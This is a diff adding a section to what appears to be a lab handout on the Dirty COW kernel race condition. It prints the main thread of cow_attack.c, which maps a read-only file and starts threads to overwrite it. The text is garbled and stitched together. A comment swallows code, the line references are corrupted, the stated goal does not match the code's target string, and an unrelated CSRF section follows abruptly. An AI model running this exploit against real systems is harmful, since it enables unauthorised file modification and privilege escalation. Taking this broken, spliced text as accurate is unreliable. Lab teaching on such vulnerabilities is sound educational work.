@@ -29,6 +29,46 @@ $ bash: /zzz: (*@Permission denied@*)
 
 From the above experiment, we can see that if we try to write to this file as a normal user, we will fail, because the file is only readable to normal users. However, because of the Dirty COW vulnerability in the system, we can find a way to write to this file. Our objective is to replace the pattern "222222" with "******".
 
+## 2.2 Set Up the Memory Mapping Thread
+
+You  check  the  program  cow  attack.c  for  this  lab.  The  program  has  three  threads:  the  main 
+thread, the write thread, and the madvise thread. The main thread maps /zzz to memory, finds 
+where  the  pattern  "222222"  is,  and  then  creates  two  threads  to  exploit  the  Dirty  COW  race 
+condition vulnerability in the OS kernel.
+```sh
+/* cow_attack.c (the main thread) */
+#include <stdio.h>
+#include <sys/mman.h>
+#include <fcntl.h>
+#include <pthread.h>
+#include <unistd.h>
+#include <sys/stat.h>
+#include <string.h>
+#include <stdint.h>
+#define OFFSET 5
+#define TARGET_CONTENT " I have successfully Attacked!! "
+void *map;
+int main(int argc, char *argv[])
+{
+pthread_t pth1,pth2;
+struct stat st;
+// Open the file in read only mode. int 
+f=open("/zzz", O_RDONLY);
+// Open with PROT_READ.
+fstat(f, &st);
+map=mmap(NULL, st.st_size, PROT_READ, MAP_PRIVATE, f, 0);
+// We have to do the attack using two threads.
+pthread_create(&pth1, NULL, madviseThread, NULL); (*@Line 1@*)
+pthread_create(&pth2, NULL, writeThread, TARGET_CONTENT); (*@Line 2@*)
+// Wait for the threads to finish. 
+pthread_join(pth1, NULL); 
+pthread_join(pth2, NULL);
+return 0;
+}
+```
+In the above code, we start two threads: madviseThread (Line À) and writeThread (Line `)
+
+
 ## 3 Background of CSRF Attacks
 A CSRF attack involves three actors: a trusted site (Elgg), a victim user of the trusted site, and a malicious  site.  The  victim  user  simultaneously  visits  the  malicious  site  while  holding  an  active session with the trusted site. The attack involves the following sequence of steps:
 1. The victim user logs into the trusted site using his/her username and password, and thus 
